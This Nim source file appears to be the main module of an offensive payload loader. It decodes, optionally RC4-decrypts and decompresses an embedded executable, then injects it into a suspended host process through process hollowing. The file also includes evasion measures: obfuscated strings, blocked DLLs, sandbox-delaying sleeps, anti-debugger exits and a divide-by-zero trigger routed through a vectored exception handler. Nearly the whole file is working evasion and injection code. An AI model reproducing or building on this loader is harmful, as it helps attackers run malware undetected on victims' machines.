# Internal
import utils
import params
import antidebug
# External
import os
import RC4
import winim
import strutils
import nimprotect
import supersnappy
from std/base64 import decode

# Import per module chosen
when defined(hollow1) or defined(hollow2) or defined(hollow3):
    import hollow123
when defined(hollow4) or defined(hollow5) or defined(hollow6):
    import hollow456

const STATUS_INTEGER_DIVIDE_BY_ZERO = 0xC0000094


# Raising VEH
{.emit: """
#include <windows.h>
void raiseVEH() {
    int x = 4 / 0;
}
""".}
proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}


proc execute(
    payload: string, 
    sponsorCmd: string = getAppFilename(), 
    isBlockDlls: bool, 
    sleepSeconds: int = 0, 
    sleepBetweenSteps: int = 0,
    isEncrypted: bool
    ): bool =
      
    # Decode, (Decrypt) and decompress PE
    let commandLineParams = commandLineParams()
    var decodedPayload = decode(payload)
    var peStr: string
    var isKeySupplied = false
    if isEncrypted:
        for i in commandLineParams:
            if i.startsWith(protectString("-K:")) and len(i) > 3:
                isKeySupplied = true
                var key = i.replace(protectString("-K:"), "")
                try:
                    peStr = uncompress(fromRC4(key, decodedPayload))
                except SnappyError: # Wrong RC4 key
                    quit(1)
        if not isKeySupplied:
            quit(1)
    else:
        peStr = uncompress(decodedPayload)

    # Check hollow split args 
    when defined(hollow4) or defined(hollow5) or defined(hollow6):
        for i in commandLineParams:
            if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
                # This is a worker process in split hollow, let it go
                return hollow456Worker(peStr)
        if not (protectString("-M") in commandLineParams):
            quit(1)

    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)

    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
        if antiDebugAction == protectString("die"):
            quit(1)
        elif antiDebugAction == protectString("troll"):
            sleepUselessCalculations(999999999)

    # Create suspended process with extended attributes (block dll's)
    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)

    # Execute module
    when defined(hollow1) or defined(hollow2) or defined(hollow3):
        return hollow123(peStr, ppi, sleepBetweenSteps)
    when defined(hollow4) or defined(hollow5) or defined(hollow6):
        return hollow456Manager(peStr, ppi, sleepBetweenSteps)


proc wrapExecute() =
    discard execute(
        payload = payload, 
        sponsorCmd = sponsorPath & sponsorParams,
        isBlockDlls = isBlockDlls,
        sleepSeconds = sleepSeconds,
        sleepBetweenSteps = sleepBetweenSteps,
        isEncrypted = isEncrypted
    )
    quit(0)


proc wrapExecuteVEH(pExceptInfo: PEXCEPTION_POINTERS): LONG =
    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](STATUS_INTEGER_DIVIDE_BY_ZERO)): 
        wrap_execute()
    else:
        return EXCEPTION_CONTINUE_SEARCH


proc main*() =
    if isVeh:
        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrapExecuteVEH))
        raiseVEH()
    else:
        wrapExecute()


when isMainModule:
    main()